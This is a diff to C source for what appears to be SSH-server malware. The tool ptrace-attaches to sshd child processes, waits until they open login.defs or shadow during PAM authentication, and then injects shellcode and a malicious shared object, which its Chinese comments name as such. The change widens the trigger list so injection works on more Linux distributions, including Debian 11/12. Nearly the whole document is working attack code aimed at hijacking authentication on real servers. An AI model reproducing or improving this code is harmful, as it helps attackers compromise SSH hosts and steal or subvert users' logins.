@@ -603,9 +603,29 @@ int inject_shellcode(pid_t target_pid)
 }
 
 /*
+ * PAM 流程特征文件: 子进程 open/openat 命中任意一个即触发注入.
+ * 时机约束: 需在 pam_unix.so 加载之后、pam_set_data 回填认证结果之前.
+ *   - login.defs: 由 pam_umask(session 阶段)读取,
+ *     Ubuntu 系 / EL 系 / Debian13+ 的默认 PAM 栈自带该模块
+ *   - shadow:     由 pam_unix 认证阶段读取,
+ *     覆盖 Debian 11/12 等默认栈不含 pam_umask 的环境
+ */
+static const char *trigger_files[] = { "login.defs", "shadow", NULL };
+
+static int hit_trigger(const char *path)
+{
+    for (int i = 0; trigger_files[i] != NULL; i++) {
+        if (strstr(path, trigger_files[i])) {
+            return 1;
+        }
+    }
+    return 0;
+}
+
+/*
  * sshd 子进程跟踪线程入口:
  * attach 到 fork 出的 sshd 子进程, 监听其系统调用,
- * 等它 open/openat "login.defs"(PAM 认证阶段特征)时注入恶意 so.
+ * 等它 open/openat 命中 PAM 流程特征文件(见 trigger_files)时注入恶意 so.
  * 注入后继续等待子进程退出, 并将其压入 gc 栈等待 main 线程回收.
  */
 int wait_for_libpam(pid_t target_pid)
@@ -621,9 +641,7 @@ int wait_for_libpam(pid_t target_pid)
         return -1;
     }
 
-    /* login.defs 会在 PAM 认证阶段被读取, 作为注入时机信号 */
     char *path = malloc(255);
-    char trigger_file[] = "login.defs";
 
     while (1) {
         ptrace(PTRACE_SYSCALL, target_pid, NULL, 0);
@@ -637,7 +655,7 @@ int wait_for_libpam(pid_t target_pid)
         if (num == 257) { /* openat, 路径参数在 rsi */
             ptrace_getregs(target_pid, &regs);
             ptrace_readdata(target_pid, (uint8_t *)regs.rsi, (uint8_t *)path, 255);
-            if (strstr(path, trigger_file)) {
+            if (hit_trigger(path)) {
                 printf("+ [WaitforLibPAM][%d] SubProcess: openat find path: %s\n", target_pid, path);
                 ptrace_detach(target_pid);
                 inject_shellcode(target_pid);
@@ -647,7 +665,7 @@ int wait_for_libpam(pid_t target_pid)
         if (num == 2) { /* open, 路径参数在 rdi */
             ptrace_getregs(target_pid, &regs);
             ptrace_readdata(target_pid, (uint8_t *)regs.rdi, (uint8_t *)path, 255);
-            if (strstr(path, trigger_file)) {
+            if (hit_trigger(path)) {
                 printf("+ [WaitforLibPAM][%d] SubProcess: open find path: %s\n", target_pid, path);
                 ptrace_detach(target_pid);
                 inject_shellcode(target_pid);
